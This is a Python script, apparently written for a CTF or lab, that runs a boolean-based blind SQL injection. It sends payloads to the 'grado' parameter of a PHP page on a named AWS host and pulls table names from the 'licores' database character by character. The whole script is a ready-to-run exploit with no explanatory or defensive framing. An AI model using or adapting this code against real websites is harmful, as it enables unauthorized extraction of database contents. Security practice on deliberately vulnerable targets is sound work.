import requests

url = "http://ec2-13-50-235-55.eu-north-1.compute.amazonaws.com:83/index.php"
charset = "abcdefghijklmnopqrstuvwxyz0123456789_"

def blind_string(query):
    result = ""
    for pos in range(1, 50):
        found = False
        for c in charset:
            payload = f"30' AND SUBSTRING(({query}),{pos},1)='{c}'-- -"
            r = requests.get(url, params={"grado": payload})
            if "Limonchelo" in r.text:
                result += c
                found = True
                break
        if not found:
            break
    return result

# Sacar tablas una a una
tables = []
for i in range(0, 10):  # máx 10 tablas
    table = blind_string(f"SELECT table_name FROM information_schema.tables WHERE table_schema='licores' LIMIT {i},1")
    if not table:
        break
    tables.append(table)
    print(f"[+] Tabla {i}: {table}")

print("[+] Tablas encontradas:", tables)
